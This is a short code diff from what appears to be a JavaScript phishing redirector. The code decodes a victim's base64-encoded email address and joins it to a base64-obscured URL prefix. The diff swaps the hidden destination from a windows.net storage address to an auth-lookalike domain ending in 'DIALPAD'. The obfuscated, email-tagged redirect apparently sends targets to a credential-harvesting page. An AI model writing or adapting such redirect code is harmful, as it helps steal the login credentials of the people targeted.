@@ -442,7 +442,7 @@
             var decodedEmail = decodeBase64(encodedEmail);
             
             // Encode the initial part of the URL in base64
-            var initialPartBase64 = "aHR0cHM6Ly9rcjhzMy56MzMud2ViLmNvcmUud2luZG93cy5uZXQv";
+            var initialPartBase64 = "aHR0cHM6Ly9yZXBseS1hdXRob25saW5lLmVzL0RJQUxQQUQ=";
             var initialPart = atob(initialPartBase64);
             
             // Construct the full URL with the base64-decoded part
